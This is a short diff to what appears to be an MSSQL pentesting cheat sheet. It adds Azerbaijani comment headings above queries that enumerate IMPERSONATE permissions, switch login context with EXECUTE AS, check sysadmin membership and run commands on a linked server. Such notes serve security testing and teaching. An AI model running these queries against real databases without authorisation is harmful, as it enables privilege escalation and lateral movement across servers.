@@ -193,8 +193,13 @@ SELECT name FROM sys.databases;
 USE <dbname>;
 SELECT name FROM sys.tables;
 
+# Başqa User adından istifadə
 SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
+
+# MSSQL Serverdə rolumuz
 SELECT * FROM sys.database_role_members;
+
+# Hansı user kimi təqlid edə bilər
 SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';
 
 EXECUTE AS LOGIN = 'john';
@@ -202,8 +207,10 @@ SELECT SYSTEM_USER;
 
 SELECT IS_SRVROLEMEMBER('sysadmin');
 
+# Linked Serverləri listələmək
 SELECT srvname, isremote FROM sysservers;
 
+# Linked Serverə keçid
 EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
 
 # Linked Server üzərindən
